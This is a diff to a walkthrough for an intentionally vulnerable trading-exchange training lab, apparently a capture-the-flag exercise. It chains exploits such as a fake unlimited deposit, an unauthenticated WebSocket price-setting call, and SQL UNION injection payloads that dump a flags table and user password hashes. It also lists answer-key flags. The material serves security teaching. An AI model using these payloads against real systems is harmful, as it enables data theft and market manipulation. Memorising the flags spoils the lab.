@@ -15,11 +15,11 @@ These are multi-step attack scenarios that chain 3+ vulnerabilities together for
 1. **Register** a new account (`POST /api/auth/register`)
 2. **Bypass KYC** — set any first name to auto-verify to Level 2 (BIZ-15)
 3. **Deposit unlimited funds** — no source verification (BIZ-05): `POST /api/accounts/deposit {"amount":1000000,"sourceAccount":"fake"}`
-4. **Buy VULN** — place a large market or limit order for VULN token at ~$42
-5. **Discover admin.setPrice is unprotected** — the STOMP interceptor logs but doesn't block (AUTHZ-09)
+4. **Buy VULN** — place a large market or limit order for VULN token (its price oscillates ~100 ±20 on a predictable sine wave, BIZ-16)
+5. **Discover admin.setPrice has no authorization** — the `/app/admin.setPrice` handler has **no role check at all** (BIZ-01 / WS-02), so any authenticated non-admin can call it
 6. **Manipulate VULN price** — send via WebSocket: `sendMessage('/app/admin.setPrice', {symbol:'VULN', price:99999})`
 7. **Portfolio skyrockets** — VULN position now worth millions
-8. **Visit leaderboard** — you're #1 → flag appears in a gold banner
+8. **Visit leaderboard** — you're #1 → `LeaderboardController` returns the flag in the rank-#1 banner (FLAG 11)
 
 **Impact in real world:** Oracle manipulation is the #1 DeFi exploit vector. This teaches the same concept in a centralized exchange context.
 
@@ -37,10 +37,12 @@ These are multi-step attack scenarios that chain 3+ vulnerabilities together for
    - Find admin notes: `FLAG{1d0r_4dm1n_pr0f1l3_n0t3s}`
    - Find trader2 SSN: `987-65-4321`
    - Find trader2 portfolio notes: `FLAG{h0r1z0nt4l_pr1v3sc_p0rtf0l10}`
-3. **SQL injection via History page** — use WebSocket SQLi to dump the hidden `flags` table (INJ-02)
-   - Payload: `' UNION SELECT 1, flag_name||':'||flag_value, 3, 4, now() FROM flags --`
-   - Extract: `FLAG{sql1_h1dd3n_t4bl3_fl4g}`, `FLAG{b0nus_y0u_dump3d_th3_wh0l3_db}`, `FLAG{d4t4b4s3_m4st3r_k3y_3xtr4ct3d}`
+3. **SQL injection via History page** — the STOMP `/app/trade.getHistory` query concatenates `startDate`, `endDate`, and `symbol` straight into the SQL (WS-01 / INJ-02–04). The base query selects **5 columns** (`t.id, t.symbol, t.quantity, t.price, t.executed_at`), so a UNION dump must supply 5 columns:
+   - Payload (into any injectable field, e.g. `symbol`): `' UNION SELECT 1, flag_name||':'||flag_value, 3, 4, now() FROM flags --`
+   - Extract: `FLAG{sql1_h1dd3n_t4bl3_fl4g}`, `FLAG{b0nus_y0u_dump3d_th3_wh0l3_db}`, `FLAG{d4t4b4s3_m4st3r_k3y_3xtr4ct3d}` (and the other rows the `flags` table holds)
 4. **Dump user credentials** — `' UNION SELECT id, username||':'||password_hash, 0, 0, now() FROM users --`
+
+> The exploit suite proves the injection reaches SQL **error-based** (a UNION with the wrong column count trips the Postgres grammar parser and the handler relays the DB error back). The UNION-dump above is the manual extraction once the column count is matched.
 
 **Impact in real world:** Customer data breach. Regulatory fines, legal liability, loss of trading license.
 
